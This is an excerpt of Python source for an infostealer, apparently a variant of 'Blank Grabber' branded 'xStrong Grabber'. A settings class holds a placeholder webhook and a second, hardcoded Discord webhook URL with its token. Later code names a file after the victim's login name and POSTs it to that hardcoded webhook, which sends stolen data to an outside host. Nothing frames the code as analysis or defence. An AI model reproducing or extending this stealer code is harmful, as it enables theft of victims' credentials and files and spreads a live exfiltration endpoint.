...
class Settings:
    Webhook = "%webhook%"
    Webhook2 = "https://discord.com/api/webhooks/1114829961824575508/qN3bp8aIQkjc-ATg6Ikc6DdX97RqR0xhVBXPliflKeXBM4rKhlUDKCWcdlqXCsZGnZlT"
    PingMe = bool("%pingme%")
...
class BlankGrabber:
  ...
  "username" : "xStrong Grabber",
  "avatar_url" : image_url
}

            filename = "xS-{}.{}".format(os.getlogin(), extention)
            ...
            http.request("POST", Settings.Webhook2, fields= fields)
